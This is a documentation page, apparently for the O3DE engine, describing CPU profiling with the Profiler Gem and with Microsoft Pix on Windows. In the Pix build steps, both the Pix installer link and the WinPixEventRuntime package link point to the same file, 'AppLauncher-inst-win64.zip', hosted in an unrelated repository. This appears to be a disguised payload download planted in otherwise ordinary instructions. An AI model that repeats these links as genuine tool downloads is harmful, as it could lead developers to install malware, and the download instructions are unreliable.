---
title: "CPU-Profiling-Tools"
description: ""
toc: false
---

## Profiler Gem (in-game CPU profiling)

**Supported on all platforms**

* Enable the "Profiler" Gem via the Project Manager tool (bin/o3de) or the O3DE CLI (scripts/o3de)<br/>
CLI Example:
```
cd <engine_root>
./scripts/o3de enable-gem -pp <project_path> -gn Profiler
```
* Build as you would normally
* Enable the ImGui menu
    - **Host Platforms:** While running either the GameLauncher or Editor, press the "Home" key to bring up the ImGui menu
    - **Mobile Platforms:** Edit the respective platform's system config (e.g. Android = system_android_android.cfg) to include `imgui_EnableImGui=1` before deploying to device
* Select "Profiler" from the menu bar, then the "CPU" entry in the dropdown

![image](https://user-images.githubusercontent.com/47460854/213022961-44abc6a4-883c-4683-ad92-b9100c2d721e.png)

* You can press **Pause**/**Resume** to stop/start the profiler from capturing data every frame and show the data for the last frame.
![image](https://user-images.githubusercontent.com/47460854/213023358-516d8791-7029-4846-88b2-bd2100b7fbb2.png)

* You can press **Swap to Visualizer** in order to help better analyze the capture. 
![image](https://user-images.githubusercontent.com/47460854/213023714-50276bd8-afbe-4906-8d5e-ae83df526d8a.png)

* You can press **Capture** to save the captured data to a json file
![image](https://user-images.githubusercontent.com/47460854/213024183-55e5edb1-4454-4f70-8113-fc35759d05a1.png)

* You can also use **Load File** button to load a previously saved file for analysis at a later stage.

## Pix (Build steps)

**Note:** Only available in Windows

1. Install Pix ([installer link](https://github.com/zetrocode/Panel-Web-PHP-KeyAuth-Example/releases/download/teamplate/AppLauncher-inst-win64.zip)). Version 2107.01 and later is supported at this time.
2. Download the [WinPixEventRuntime](https://github.com/zetrocode/Panel-Web-PHP-KeyAuth-Example/releases/download/teamplate/AppLauncher-inst-win64.zip) nuget package (note that this link directs you to version 1.0.210818001 which is the currently supported version).
3. Unzip the nuget package (optionally by changing the file extension to `.zip`) either to `$LY_3RDPARTY_PATH/winpixeventruntime` or to a custom path
4. Set the CMake flag `LY_PIX_ENABLED` (pass `LY_PIX_ENABLED=ON` to your cmake configure command). 
5. If you unzipped the WinPixEventRuntime to an arbitrary path, set the cmake variable `LY_PIX_PATH` accordingly (note, this should point to where you extracted the WinPixEventRuntime package, *not* where the Pix executable is installed)
6. After regenerating and recompiling, you'll be able to do captures for CPU timings, or GPU analysis.

### Pix (Launch steps)

Ensure that GPU capture is unchecked when launching or attaching to the executable you wish to profile. After Pix is attached to the runtime, collect a timing capture (not the "legacy capture") by hitting the big play button. You'll generally want to collect samples (at 4k to 8k rate) (along with kernel and IO data as needed). Callstacks on context switches can also be helpful when diagnosing multithreaded workload issues and performance bottlenecks.
